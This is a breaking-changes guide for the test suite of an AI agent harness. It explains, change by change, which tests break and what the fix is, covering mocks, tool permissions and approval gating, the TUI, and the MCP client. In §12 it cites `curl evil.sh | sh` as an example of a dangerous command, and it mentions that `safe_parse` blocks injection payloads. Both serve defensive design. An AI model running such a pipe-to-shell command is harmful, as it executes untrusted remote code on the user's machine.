# Breaking Changes — Fragile Mock Points in the Test Suite

This file documents why each fragile test in this suite breaks, and what
the fix is expected to be when a planned refactor touches the surface
the test mocks against.

Read this BEFORE updating a failing test that mentions this file in its
docstring. A failure here usually signals a real design change upstream
worth understanding, not a flaky mock to patch over.

---

## 1. `test_orchestrator.py` — the most fragile mock in the suite

This file mocks `RunAgentLoop.stream_deep_research_mode` keyed by `pass_id`
strings ("Pass 0", "Pass 3a", "Final synthesis", ...). The orchestrator
calls `_run_pass(pass_id, ...)`, which since §26 ITERATES
`stream_deep_research_mode(pass_id=pass_id, ...)` rather than calling
`run_deep_research_mode`. Mocks intercept at that boundary, NOT `_run_pass`,
so anything that refactors `_run_pass`'s *internals* doesn't break this test.

**Every patch goes through `tests/conftest.py`'s `pass_stream`**, which wraps
a plain pass-mock into a generator. That indirection is the point: a double
patched on the old name **stops intercepting silently** — `mocker.patch.object`
on a real attribute still succeeds, the real loop runs, reaches a provider,
and the test fails somewhere unrelated. §22's twelve-doubles trap, one layer
down. Repoint `pass_stream` if the boundary moves again; do not open-code a
double at each of the fifteen sites.

This section and `test_orchestrator.py`'s banner both named
`run_deep_research_mode` for two sections after §26 moved it — i.e. the two
documents whose entire job is to keep this mock repointable were handing a
maintainer the name that springs the trap (audit #122).

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
| Rename a pass (e.g. "Pass 3a" → "Grounding") in `orchestrator.py` and `system_prompts.py` | `AssertionError: orchestrator called an unexpected pass_id 'Grounding'` | Update the keys in `_canned_pass_responses` in the test to match the new pass_id strings |
| Change the JSON SHAPE a pass returns — e.g. Pass 2 claims growing a `confidence` field | The orchestrator's `_claim_from_json` filters unknown fields silently (via the `_CLAIM_INPUT_FIELDS` allowlist), so this *doesn't break* the test until a required field is added | If a NEW required field is added to `_CLAIM_INPUT_FIELDS`, include it in the canned Pass 2 mock payloads |
| Widen or narrow `_CLAIM_INPUT_FIELDS` itself | `TestClaimFromJsonFiltersUnknownFields::test_every_allowlisted_field_still_arrives` fails on its exact-contents assertion | Update that assertion, and check the worked example in the row above is still a key the allowlist does **not** contain. This row exists because the previous example was `asserted_by_candidates`, which §10's revisit moved *into* the allowlist — so both this file and `test_orchestrator.py`'s banner spent a section describing filtering with an example that was no longer filtered (issue #123) |
| Add a new pass between existing passes | `AssertionError` on pass-order assertion (the `call_log == expected_order` check) | Add the new pass_id to `_canned_pass_responses` (with its expected JSON shape), insert into the expected pass order list in tests |
| Change the Trace line *format* (e.g. `Pass 0: plan produced (X entities)` → `Pass 0 produced X-entities`) | The `test_pipeline_trace_contains_expected_lines_in_order` test uses `startswith()` against prefix strings like `"Pass 0:"` | Update the `expected_pass_starts` list in that one test to match the new format |
| Refactor `_run_pass` → `_run_pass_with_json_retry` (ROADMAP §3) | Should NOT break this test, since the mock is on `stream_deep_research_mode` not `_run_pass` | If the refactor changes which ENTRYPOINT the orchestrator calls, repoint `conftest.pass_stream` |
| Move the orchestrator's inner call off `stream_deep_research_mode` again | **Nothing raises.** The patch still applies, the interception is lost, and the failure lands somewhere unrelated with a real provider call behind it | Repoint `conftest.pass_stream`'s target. This is the §26 case, and it is why the helper exists rather than fifteen open-coded doubles |
| Add a new kwarg to `RunAgentLoop.stream_deep_research_mode` (e.g. `temperature=None` per ROADMAP §10) | `TypeError: side_effect() got an unexpected keyword argument 'temperature'` | The `_build_pass_mock` side_effect already accepts `**kwargs` to swallow these, so this should NOT break. If it does, re-audit that signature. |

### The expected update pattern after ROADMAP §3 (Malformed-JSON recovery)

ROADMAP §3 refactors `_run_pass` into `_run_pass_with_json_retry` which
keeps appending retry messages to the SAME pass's thread. If the
implementation chooses to keep using `_run_pass` as the inner call
(with retry wrapping it externally), `test_orchestrator.py` is
unaffected — the mock still intercepts `run_deep_research_mode` calls
between `_run_pass` and the SDK. If the implementation instead reaches
into `RunAgentLoop._run()` directly (ROADMAP §3's "alternative"), the
mock target in `_build_pass_mock` needs to switch from
`RunAgentLoop.run_deep_research_mode` to `RunAgentLoop._run`.

### The retry-loop test specifically

`test_pipeline_6a6c_retry_loop_continues_until_max_retries_then_fallback`
hard-codes `MAX_RETRIES = config.MAX_PIPELINE_RETRIES`. If the retry
mechanic goes through ROADMAP §3's JSON-retry (a separate retry cap
inside _run_pass_with_json_retry), the count semantics change: the
orchestrator's outer retry loop still uses `MAX_PIPELINE_RETRIES`, but
inner JSON-retry attempts add extra `run_deep_research_mode` calls per
outer attempt. The test would need to multiply the canned 6a/6c
responses by the new retry factor.

---

## 2. `test_loop_stop_conditions.py` & `test_loop_tool_dispatch.py`

These mock `core.loop.call_model_stream` and `core.loop.registry.dispatch`
directly, both as top-level references inside `core/loop.py`.

**§13 generator conversion:** `_run()` is now a generator yielding
`LoopEvent` objects. Tests wrap it in `run_to_completion()` and mock
`core.loop.call_model_stream` (via `make_stream_from_response` from
`tests/conftest.py`) instead of `core.loop.call_model`. The mock target
changed from `core.loop.call_model` to `core.loop.call_model_stream`.
Any test that still patches `core.loop.call_model` will fail with
`AttributeError: module 'core.loop' has no attribute 'call_model'`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename or move `call_model_stream` (e.g. refactor into a different module) | The mock target `core.loop.call_model_stream` no longer exists; tests pass through to real `call_model_stream` and fail (no fake client) | Update the mock target path in both files |
| Add a new parameter to `_run()` (e.g. `tool_context` per ROADMAP §15) | `TypeError: _run() got an unexpected keyword argument` only if tests pass it; tests today use `_build_run_kwargs` / `_make_run_kwargs` so they only pass what's listed | If `_run` grows a required positional parameter (unlikely), update the kwargs builders |
| Change the `stop_reason` strings (e.g. "max_steps_reached" → "MAX_STEPS") | Direct `assert response.stop_reason == "complete"` fails | Update the string literals in the assert statements; these strings are deliberately stable per ARCHITECTURE.md §4.8 so changes here are intentional and warrant a ROADMAP update too |
| Change `_run`'s tool_gate behavior to skip the `error: not available in this context` early branch | `test_disallowed_tool_name_skips_dispatch_and_feeds_error_result` still passes IF the new behavior also avoids dispatching, fails if it dispatches | Audit the new behavior; either update the assertion expectations OR flag the change as a regression of the "tools not allowed in this context" guarantee |
| Remove `run_to_completion()` or change its import path | Tests that call `run_to_completion(RunAgentLoop._run(...))` fail with ImportError | Update the import; `run_to_completion` lives in `core/loop.py` per §13's decision |
| Change `LoopEvent` field names | Tests that inspect events directly (test_streaming_loop.py) fail on attribute access | Update field names in both production and test code |

---

## 3. `test_client_translation.py`

Mock-free pure-translation tests; should be robust.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Add Google's `_tools_for_provider` / `_messages_for_provider` implementation (ROADMAP §9) | `test_tools_google_not_implemented` and `test_messages_google_not_implemented` FAIL because NotImplementedError no longer raises | Delete or rewrite those two tests against the new translation behavior; verify the new behavior matches the SymPy/Content structures Google's SDK expects |
| Change Anthropic's tool_result batching (one user message with N tool_result blocks) — e.g. Anthropic releases a new API version that wants one message per result | `test_messages_anthropic_consecutive_tool_results_batch_into_one_user_message` fails | Update the test to assert the new shape; this is a deliberate API contract change and ARCHITECTURE.md §4.7 should be updated alongside |
| Change OpenAI's `tool_calls.function.arguments` JSON encoding shape | `test_messages_openai_assistant_with_tool_calls_serializes_arguments_as_json` fails | Either the production change is wrong (revert it) or the test expectation is wrong (update it) — verify which by re-reading ARCHITECTURE.md §4.7 load-bearing diffs |

---

## 4. `test_memory_write_through.py`

This file's tests assert the CURRENT (lossy) resume behavior — assistant
entries are persisted as the full rich dict under storage's `content`
column, and `get_session_history` returns them nested under `content`
rather than restored to their original top-level shape.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Re-fix the assistant-shape lossy-resume bug (e.g. make storage.get_session_history reconstruct the poison-neutral shape) | Tests in `test_resume_existing_thread_loads_messages_from_storage` that assert `second.messages[1]["content"]["text"] == "Hi there"` need rewriting to assert `second.messages[1]["text"] == "Hi there"` (top-level keys returned, not nested) | This is a desirable fix. Update those tests to assert the now-uniform shape. The asymmetry note at the top of the file should also be removed/replaced. |
| Reintroduce `from core.storage import ...` in `core/memory.py` | `test_core_memory_import_succeeds` fails with an ImportError mentioning `core.storage` | Revert the import to `from storage import ...` per ARCHITECTURE.md §11 |
| Change `add_assistant_message` to take a different argument (e.g. raw SDK object instead of normalized ModelResponse) — ARCHITECTURE.md §4.6 explicitly forbids this | `test_add_assistant_message_appends_and_save_uses_neutral_shape` fails because it builds a `ModelResponse` to pass in | This is a regression of the §4.6 contract; flag and revert, do NOT update the test to pass SDK objects |

---

## 5. `test_registry_permissions.py`

Mock-friendly: monkeypatches `is_tool_allowed` and `requires_approval`
at the `tools.registry` module namespace. Independent of config defaults.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| `registry.dispatch` adds a new step (e.g. `check_output_policy` from ROADMAP §8) | Tests still pass — they only verify policy enforcement, not the post-call content filter | If you want post-call coverage too, add a new test; don't modify existing ones |
| Add a `core/loop.py` integration that uses a different exception class instead of `ToolCallDenied` | `test_loop_tool_dispatch.py::test_registry_dispatch_raises_ToolCallDenied_caught_and_recorded_as_error` fails | Update the import in that test from `ToolCallDenied` to the new class |
| Change `ToolCallDenied`'s message wording (e.g. "approval" → "consent") | String assertions like `"approval" in result["error"].lower()` may fail | Update the substring checks; keep them loose (lowercase substring) so wording can drift without rewriting tests |

---

## 6. `test_math_tools.py`

Stable across SymPy version drift (uses symbolic equivalence, not string
equality).

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename any tool's operations (e.g. "dot_product" → "dot") | Tests pass operation names directly to `run({"operation": "..."})`; will raise a pydantic ValidationError | Update the operation string in the relevant test |
| Change the param model field names (e.g. `vector_a` → `first_vector`) | ValidationError: missing field | Update the param dict in the affected test |
| Make `safe_parse` not raise on injection payloads (e.g. accidentally leave `__builtins__` in the namespace) | `test_safe_parse_blocks_dunder_import_injection` may or may not catch it (depends on whether the payload actually executes) — this is a SECURITY regression. Treat any change to `_SAFE_GLOBALS` in `_math_common.py` as a security-sensitive diff and audit before merging. | Do NOT update the test to "make it pass". The test is correctly asserting a security invariant; the production code must change. |
| Bump SymPy major version | Symbolic equivalence (`sympy.simplify(a - b) == 0`) should hold; minor serialization drift is absorbed by the equivalence check | If a major version introduces a different `Matrix.dot` return type for matrix-vs-vector or changes integer behavior, audit and update expectations |

---

## 7. `test_confidence_scoring.py`

Pure-function tests against `score_claim`. Stable by design; the formula
is manually maintained in `confidence_scoring.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Adjust `TIER_THRESHOLDS` (e.g. the LOW cutoff moves from 0.3 to 0.25) | General coverage tests (`test_partial_grounding_factual_lands_medium`, `test_synthesis_above_cap_drops_tier_when_penalized`) may land in different tiers | Update the expected tier in those assertions; the three ROADMAP-required regression tests (HIGH, UNVERIFIED, cap-swallows-penalty) should remain valid REGARDLESS of threshold tuning — if any of those three break, the formula change is a real regression of the regression-guarded invariant |
| Move the cap from `NON_FACTUAL_SCORE_CAP = 0.65` to a different threshold | The cap-before-penalty regression test still passes IF the cap is applied before penalty (the regression test only checks the GAP between clean and flagged claims is exactly `ASSUMPTION_FLAG_PENALTY`, regardless of where the cap sits); the general test `test_synthesis_above_cap_drops_tier_when_penalized` may break depending on new cap value vs flag count arithmetic | Re-audit the general tests against the new cap value; the regression test should keep passing if the formula invariant holds |
| Apply ensemble-mode scoring (ROADMAP §10) — adds a `consistency_score` term and takes `ensemble_n` as a parameter | All five tests still pass: they call `score_claim(claim)` with the default (no ensemble_n), which falls into the unchanged non-ensemble branch | If ensemble-n becomes a required parameter (no default), update tests to pass `ensemble_n=0` explicitly |

---

## 8. `test_pipeline_storage.py` & the §5 persistence schema/status

These tests exercise `core/reasoning/pipeline_storage.py`
(`create_pipeline_run` / `update_pipeline_run` / `load_pipeline_run`)
against the upgraded fake sqlmodel, plus the orchestrator's failure-path
persistence wrap and per-pass checkpointing.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename a `PipelineRunRecord` column (`claims_json` / `trace_json` / `coverage_gaps_json` / `pass_threads_json` / `candidates_json` / `final_report`) or change its type | `test_update_pipeline_run_on_complete_marks_complete_and_stores_columns` and `test_load_pipeline_run_round_trips_all_fields` fail with `AttributeError` on the record, or a `json.loads` mismatch | Update the column name/type in both the write and read assertions; keep the separate-columns convention (do NOT collapse back into one blob — see DEVLOG §3.4 for why) |
| Change the `status` literals (`running` / `complete` / `failed`) | `test_..._marks_complete...` and the orchestrator failure/success-path tests fail on the status assertion | Update the literal in both `pipeline_storage.py` (terminal check) and the tests. `complete` is deliberately aligned with `ModelResponse.stop_reason`'s `"complete"` — don't drift it back to `succeeded` |
| Change `update_pipeline_run`'s serialization (e.g. `vars(c)` → `asdict(c)`, or add a field to `Claim`) | The `claims_json` round-trip assertion may change shape | Per the migration note on `Claim` in `base.py`: if a nested-dataclass field is added, migrate EVERY `vars(c)` site (orchestrator passes + `pipeline_storage`) to `asdict(c)` together, then update the test's expected claim dict |
| Change the inner-failure logging in `orchestrator.py`'s except block (the `logger.error(...)` call) | `test_inner_storage_failure_propagates_original_exception_and_logs_run_id` fails — either the original exception is masked (real regression) or the run_id no longer appears in the log message | The invariant: the ORIGINAL pipeline exception must propagate, and the persistence failure must be logged at ERROR naming the `run_id`. Restore both before touching the test |
| Add/remove a `load_pipeline_run` return field | `test_load_pipeline_run_round_trips_all_fields` fails on the key-set assertion, and `test_the_documented_record_shape_matches_what_load_returns` fails against ARCHITECTURE §4.14 | Update the assertion and the two sentences in ARCHITECTURE that state the shape. **This row described a symptom the test did not produce until batch 154**: every assertion named one key, so a twelfth field was green and a dropped `pass_threads` was green, and the "9-field contract" it cited was both stale (11 since T2 and E13) and not in any docstring. The contract is the `return {...}` in `load_pipeline_run`; the gate is what keeps the prose equal to it |
| Remove or relocate a per-pass `update_pipeline_run(run.run_id, run)` checkpoint in `orchestrator.py` | `test_crash_after_pass_3b_leaves_claims_populated_via_load` or `test_hard_kill_bypasses_except_block_checkpoint_survives` fails — claims or trace are empty/incomplete after a mid-pipeline crash | Restore the checkpoint after the affected `run.log(...)` call. The invariant: every `run.log(...)` (except "Final synthesis complete.", which is subsumed by the terminal update) is followed by a data-only checkpoint. See DEVLOG §5.1 for the full 16-site list |
| Change `test_pipeline_success_marks_run_complete`'s status assertion back to `statuses_seen == ["complete"]` | The test fails because per-pass checkpoints add `None`-status calls before the terminal `"complete"` | The correct assertion: last call is `"complete"`, all preceding are `None`, and at least one `None` exists. See DEVLOG §5.6 |

---

## 9. `test_cli.py` — parser defaults, trust flow, and prompt assembly (§14)

§14 changed `main.py`: `--provider`/`--model` now default to `None` and
resolve AFTER parsing via `resolve_runtime_defaults()` (CLI >
settings.json > config.py), a `--trust-project` flag was added, and
startup runs `_ensure_workspace_trust()` + `config_loader.initialize()`.
System prompts now assemble through
`prompts.system_prompts.with_skill_catalog()` / `pass_prompt()`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Move parser defaults back to argparse-level constants (`default=DEFAULT_PROVIDER`) | `test_build_parser_defaults` fails (asserts `None`) | The `None` defaults are load-bearing: argparse fill-in must be distinguishable from an explicit CLI choice or settings.json can never win. Resolution lives in `resolve_runtime_defaults()` |
| Rename a known settings.json key | `test_resolve_runtime_defaults_precedence` fails | Update the dict keys; the known-key schema lives in `core/config_loader.py::_KNOWN_SETTINGS` and must change in the same commit |
| Change the non-TTY notice wording | `test_trust_non_tty_skips_without_hanging` asserts the notice mentions `--trust-project` | Keep the flag name in the notice (it is the remediation the user needs); the flag itself is user-facing CLI surface and should not be renamed casually |
| Change `describe_project_content()` so settings.json is no longer shown verbatim | `test_trust_prompt_shows_settings_contents` fails | The verbatim display is the informed-consent amendment (DEVLOG §14): a project's settings can pick the provider and multiply pipeline cost, so approval must show them. Restore verbatim display |
| Assert exact system-prompt text passed to `_run()` in any test | Prompt gains an appended `## Available skills` catalog whenever `config_loader` was initialized with skills present | The autouse `clear_config_loader_state` fixture (tests/conftest.py) resets the cache between tests; only `initialize()` with skills inside a test that wants the catalog |
| Move `pass_prompt()`/`with_skill_catalog()` out of `prompts/system_prompts.py` | `test_load_skill.py` prompt-assembly tests fail on import | Keep both there; the §3 JSON-retry path and `run_deep_research_mode` must share one assembly point so the catalog cannot diverge between an attempt and its retry |

---

## 10. Permission signatures, `ToolContext`, and advertised schemas (§15)

§15 added an optional `ToolContext` to every permission entry point and
replaced `_run()`'s `allowed_tools` list with it. Three signatures
changed, and one behavioural default changed with them.

**Signatures:** `is_tool_allowed(name, context=None)`,
`requires_approval(name, params, context=None)`,
`ToolRegistry.approval_needed(name, params, context=None)`,
`ToolRegistry.dispatch(name, params, context=None, approval_callback=None)`,
`ToolRegistry.schemas(context=None)` (was `schemas(tool_names: list[str])`),
`RunAgentLoop._run(..., context, ...)` (was `allowed_tools`).

**Behaviour:** `schemas()` now returns only tools that pass
`is_tool_allowed(name, context)` and any `ToolSpec.available_check`. Under
default config that is **12 of 16** registered tools — `read`/`write`/
`edit`/`shell` are permission `False`. It was 11 until §19: `load_skill`
has an `available_check` that hid it while no skills existed, and §19
shipped four builtins, so it is now advertised for the first time.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Monkeypatch `tools.registry.is_tool_allowed` / `requires_approval` with a lambda taking the OLD arity | `TypeError: <lambda>() takes N positional arguments but N+1 were given` | Add `context=None` to the stub. `mocker.patch(..., return_value=X)` is unaffected — it ignores arity, which is why `test_policy_enforcement.py` survived untouched |
| Define a `fake_dispatch(name, params, approval_callback=None)` test double | `TypeError: got an unexpected keyword argument 'context'` — the loop always passes `context=` | Add `context=None` to the stub signature |
| Assert `dispatch.assert_called_once_with(name, params)` | Fails: actual call is `(name, params, context=None)` | Include `context=None` (or the ToolContext under test) in the expectation |
| Move the approval OR-composition out of `approval_needed()` and back into `dispatch()` | `test_loop_tool_dispatch.py::test_context_is_forwarded_to_dispatch_and_approval_needed` and the AC3 tests still pass, but the loop's permission bridge silently diverges from dispatch | **Do not.** `approval_needed()` is the single source of truth §13 created and §15 extended; the two callers must compute approval from the same code. See DEVLOG §15.3.1 — the ROADMAP sketch gets this wrong because it predates §13 |
| Make a tool's `approval_check` REPLACE `requires_approval()` again instead of OR-ing with it | `test_ac3_context_false_does_not_suppress_tool_approval_check` and `test_approval_check_false_still_consults_config_and_context` fail | This is the specific regression §15 exists to close: an either/or makes agent `approval_overrides` silently inert for `read`/`write`/`edit`/`shell` — the four tools where per-agent tightening matters most |
| Let a context re-enable a globally disabled tool (reorder the AND so the context is checked first, or make `allowed_tools` additive) | `test_ac1_*` fail | The global check is unconditional and first, by design. Agent definitions can come from a merely-trusted project directory; none may hand themselves a capability the user turned off |
| Give `approval_overrides` three-state semantics so `False` can suppress approval | `test_ac3_*` fail | Under OR, `False` is indistinguishable from absent — that asymmetry IS D14. A context may tighten, never loosen |
| Drop `check_output_policy()` from `dispatch()` while refactoring it | `test_ac5_check_output_policy_still_runs_on_dispatched_results` fails | Restore it. §15's own Rev. 2 sketch omitted this line; written as sketched it would have deleted ROADMAP §8's secret redaction in the section about tightening permissions |
| Drop the unknown-tool `ValueError` guard from `dispatch()` | `test_ac7_*` fail with `KeyError` | Restore it. It matters MORE since §15, not less: runtime `unregister()` (D15) makes a stale tool name a reachable state rather than a programmer error |
| Register a tool without adding fields to BOTH `config.ToolPermissions` and `config.ToolApprovals` | `RuntimeError` at `import tools.registry` — the ENTIRE suite fails to collect, not one test | Intended (D24). Add the two boolean fields. `mcp__*` names are exempt, as is `shell` in approvals (governed solely by `shell_approval_mode`) |
| Add a tool that should not always be advertised | It appears in every `schemas()` call | Give its `ToolSpec` an `available_check` predicate, as `load_skill` does. Do not special-case it inside `schemas()` — the registry owns mechanism, not policy |
| Flip `read`/`write`/`edit`/`shell` to permission `true` in `config.yaml` | `test_schemas_omits_globally_denied_tools_from_the_real_registry` fails | Expected — the test pins the shipped default. Update it deliberately, in the same commit as the config change |
| Call `registry.schemas(["a", "b"])` with a name list | `AttributeError` on `.allowed_tools`, or a silently empty result | The list parameter is gone. Pass `ToolContext(allowed_tools={"a", "b"})` — one representation of "which tools may run", not two |

---

## 11. TUI pilot tests, reasoning effort, and the sampling gate (§16)

§16 added `tui/`, an `effort` parameter threaded from the TUI to the provider
payload, and a gate that drops sampling parameters on models that reject
them. Three new test files: `test_tui.py`, `test_client_effort.py`,
`test_ensemble_guard.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Revert `run_worker(..., exit_on_error=False)` to Textual's default | `test_ac3_exception_in_a_tool_does_not_terminate_the_app` fails, and it fails by tearing down the whole test app — the output is a full Textual crash dump, not an assertion | Restore it. The default kills the app on any transient worker exception. `on_worker_state_changed` is required alongside it or the error is reported nowhere |
| Make a permission dismissal path not put a boolean on the channel (return early, dismiss with `None`, drop the `put`) | All three AC2 tests fail at `settle`'s 10s deadline, about 11s each (measured, batch 161). The worker parks on `queue.get(timeout=ATTENDED_APPROVAL_TIMEOUT_S)`, 600s as shipped, which an autouse fixture shrinks under test (TECHNICAL_DEBT 8) — to 30s since batch 161 (A77). At its old 5s the timeout's decline landed inside the wait and read as the denial the deny and Escape tests assert, so those two PASSED with the `put` dropped and only the approve test failed | Every dismissal path, including Escape, must resolve to a boolean. This is why the AC2 tests assert on the dispatched tool: a modal that renders and drops the answer looks identical to one that works, right up until it doesn't |
| Delete the quiescing `await pilot.pause()` from `settle` | `test_pilot_wait.py::TestTheQuiesce` — two tests, on the pause count. **Not** any TUI test: 43/43 stay green under 4× CPU load, because the bare `pause()` used for polling masks the need. That masking is what made this take two attempts to find | Restore it. It and the bare `pause()` are two independent defences against one deadlock (a modal predicate goes true before the worker reaches `channel.get()`), and the pairing that actually fails is fast polling *without* it — measured 3/3 on the quitting test |
| Swap `settle`'s wall-clock deadline back for `for _ in range(120)` | `test_it_outlasts_the_old_pump_budget` and `test_a_never_true_predicate_gives_up_after_the_timeout` | A pump count is not a wait: `pilot.pause()` is 21ms with nothing burning CPU in-process and 1021ms with one busy sibling thread, so 120 pumps was worth 2.5s–122s. Re-run that mutation on an **idle** machine — under load the old helper is over-patient and passes too |
| Give `pump` a deadline, or route a negative assertion through `settle` | `TestPump` — two tests, one of them on runtime. Suite time also regresses by ~20s | `pump` backs "prove X did *not* happen", where there is no predicate to wait for; a deadline makes every such site pay its full timeout for nothing |
| Drop the `shrink_approval_timeout` autouse fixture | `test_the_approval_timeout_is_shrunk_for_tests`, on its upper bound, and nothing else — by nature it changes no outcome, only how long a broken modal path takes to reach one | Keep it. It is asserted directly precisely because no other test can notice it going |
| Shrink the approval timeout under test to `settle`'s deadline or below (it was 5s until batch 161) | `test_the_approval_timeout_is_shrunk_for_tests`, on its lower bound, and nothing else on an idle machine. Under load it is a flake in any of the 23 pilot tests that act on an open modal — `test_ac2_approving_...` failed "tool never dispatched" on the v0.3.1 tag run — and forcing 0.1s fails all 23 | Keep it above `settle`'s default timeout (A77): the worker must outwait the test that answers it. The test reads the deadline off `settle`'s signature, so the floor moves with it |
| Restart or re-enter the generator on approval instead of resuming it | `test_ac2_approving_...` fails on the dispatch assertion — a fresh generator re-issues the model call and never reaches the tool | Resume. `permission_channel` exists (§13) so the SAME generator continues |
| Add `asyncio_mode = auto` to `pytest.ini` | Nothing breaks immediately, but ARCHITECTURE §4.13's "no asyncio in pytest.ini" stops being true | Not needed — TUI tests carry explicit `@pytest.mark.asyncio`. `--strict-markers` accepts it because pytest-asyncio registers the marker |
| Change `call_model_stream`'s positional parameter order | `test_effort_reaches_the_model_call` asserts `call_args[0][7] == "high"` | Update the index, or switch the assertion to a keyword — but keep asserting on the *call arguments*, not on the raven: the indicator can be right while the parameter never leaves the UI |
| Make `effort=None` send something on any provider | `test_no_effort_sends_nothing_on_every_provider` fails | Silence is the only universally safe value: `reasoning_effort` is rejected by OpenAI-compatible non-reasoning models, adaptive thinking by pre-4.6 Anthropic models. Opt-in is what keeps §16 from changing every existing caller's behaviour |
| Tabulate Anthropic effort levels instead of querying | `test_anthropic_levels_come_from_the_api_not_a_table` fails (it uses a model name absent from every table) | Query. The entire point is that a newly released Anthropic model needs no entry in this repo |
| Query a non-Anthropic provider for capabilities | `test_non_anthropic_uses_the_table_without_querying` fails the client stub deliberately | No OpenAI-compatible provider in `providers.json` exposes a capability endpoint |
| Send `ThinkingConfig(thinking_budget=...)` unconditionally on Google | `test_google_effort_tracks_what_the_installed_sdk_can_express` fails; against the real pinned SDK it is a `TypeError` | The pinned `google-genai==1.0.0` has no such field. Keep the `_google_supports_thinking_budget()` gate, or move the pin deliberately — which also puts §9's Google implementation back in scope for retest |
| Drop the sampling parameter silently instead of logging | `test_sampling_dropped_for_models_that_reject_it` fails on the caplog assertion | Warn. A silent drop is how ensemble mode came to look like it worked |
| Make the roster guard warn-and-continue instead of raising | `test_the_refusal_lands_before_any_work` fails | Raise. Continuing produces N near-identical candidates and reports maximal cross-candidate consistency for all of them — an expensive wrong answer, not a degraded one. §16's row here named the *sampling* guard, which §10's revisit replaced; the reason carried over, the mechanism did not |
| Change `config.MODEL_NAME` to a model that accepts sampling params | `test_default_model_is_in_the_reject_set` fails | Intended as a deliberate signal: update the test in the same commit, having checked the new default really does accept them |
| Change `config.MAX_TOKENS` | Nothing fails — `test_call_model_google_text_only` asserts against the setting, not a literal | That test used to hardcode 4096 and broke when §16 raised it. Assert against the setting for tunables |
| Add a settings key without adding it to `_KNOWN_SETTINGS`/`_KNOWN_TUI` | `ValueError: unknown tui key` at load | Intended (§14 amendment 1). A preference the loader doesn't know about is a startup error, not a silently ignored line |
| Add a nested settings section without adding it to `_NESTED_SETTINGS` | It validates as a bare `dict` and **shallow-merges** across tiers — a project setting silently discards the user's sibling keys | Register it in `_NESTED_SETTINGS`; both the validator and the deep-merge iterate it. Hardcoding the section name in two places is what produced review finding F2 |
| Remove `ThinkingConfig` from the Google fake in root `conftest.py` | Every Google effort test errors on a missing attribute | The real SDK has it. A fake missing what production provides is the double drifting, not the code being wrong |

---

## 12. MCP client, the async bridge, and tier precedence (§17)

§17 added `mcp_client/`, made redaction recursive, flipped user/project tier precedence, and made
MCP tools approval-gated by default. Two new test files: `test_mcp_client.py`,
`test_mcp_config.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Collapse the `_manager()` task back into `connect_all()` entering the stack and `disconnect_all()` closing it (what §17's spec sketches) | `test_disconnect_all_unwinds_without_a_cancel_scope_error` fails with `RuntimeError: Attempted to exit cancel scope in a different task than it was entered in` in the log | Restore the manager task. anyio binds cancel scopes to the TASK, and `run_coroutine_threadsafe()` creates a new one per call — being on the right *loop* is not enough. Note the test asserts on the **log**, not on `raises`: `disconnect_all()` swallows exceptions, so a "does not raise" assertion here is unfalsifiable |
| Drop `read_timeout_seconds` and rely on `future.result(timeout=)` alone | `test_ac4_a_hanging_tool_times_out_via_the_protocol_not_the_caller` fails on elapsed time | Keep both. The protocol timeout cancels the request; the future timeout only stops waiting. Assert on **which one fired**, not on "an error came back" — both paths return an error, which is what made the first version of this test vacuous |
| Rename a package to `mcp/` | Everything fails at import: `import mcp` resolves to the local package | It must stay `mcp_client/`. The project root is on `sys.path` |
| Read `.structuredContent` / `.isError` (v1 spellings) | `test_normalize_reads_v2_snake_case_field_names` fails | v2 is snake_case. Reading v1 names against v2 doesn't crash — `getattr` returns `None`, so **every failed call silently looks successful**, the worst available shape |
| Move the `mcp` pin below 2.0 | Import errors (`MCPError`, `Client`) plus silent field mismatches | Re-verify in hand before moving it, per D22. That instruction is why §17 shipped against v2 instead of a spec written for v1 |
| Revert `_redact_value` to top-level strings only | 2 tests in `test_policy_enforcement.py` and `test_ac6_secret_in_mcp_output_is_redacted_by_the_existing_layer` fail | Keep the recursion. `structured_content` is arbitrary third-party JSON arriving under `result` as a dict; scanning only top-level strings leaves the highest-risk output unscanned |
| Restore `_tier_dirs` to `[harness, project, user]` | `test_user_wins_over_project` and `test_f3_user_over_project_collision_warns` fail | D29 inverted it deliberately. Harness stays first (D18) |
| Implement D29 as "only the user tier loads" | `test_non_colliding_definitions_from_both_tiers_all_load` fails | Precedence breaks same-name ties only; `_discover()` accumulates a union |
| Express `autoApprove` as a `ToolSpec.approval_check` instead of a base default | `test_d28_auto_approve_server_does_not_require_approval` fails | `approval_needed()` ORs approval_check in, and OR can only tighten — an opt-out there is inert. Vary the base default via `set_dynamic_approval_default` |
| Make `_default_for_unknown_approval` return False for `mcp__*` | `test_d28_mcp_tools_require_approval_by_default` fails | Allowed-by-default and trusted-by-default are different questions |
| Add a try/except-free `_connect_all_async` | `test_a_failing_server_is_named_and_skipped_without_stopping_the_others` fails | One stale entry must not make the harness unusable |
| Move project `mcp.json` back to the project root | `test_project_mcp_json_lives_under_dot_venastine` fails | At the root it sits outside D17's hash, and `is_trusted()` returns True when `.venastine/` is absent |
| Key the acknowledgement store by name only | `test_editing_the_command_makes_a_remembered_server_unknown_again` fails | Hash the entry. Otherwise approving `npx pkg` silently carries to `curl evil.sh \| sh` under the same name |
| Stub `mcp` in the root `conftest.py` like the other six SDKs | The bridge tests stop testing the bridge | Deliberate exception. v2's in-memory transport is offline already, and a fake cannot reproduce anyio's cancel scopes — the bug that shaped this design |

---

## 13. Agent system: dispatch injection, headless callability, goal mode (§18)

§18 added `parent_run` to `dispatch()`, signature-inspection injection of
`parent_context`/`parent_run` into handlers that declare them, the
headless callability filter (`schemas(callable_only=...)` +
`headless_hidden()`), `ConversationMemory.extra`/`set_extra`, and the
`system_prompt=` kwarg on `run_agent_conversation`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Define a `fake_dispatch(name, params, context=None, approval_callback=None)` test double | `TypeError: got an unexpected keyword argument 'parent_run'` / `'permission_channel'` — the loop always passes both now | Add `parent_run=None, permission_channel=None` to the stub signature |
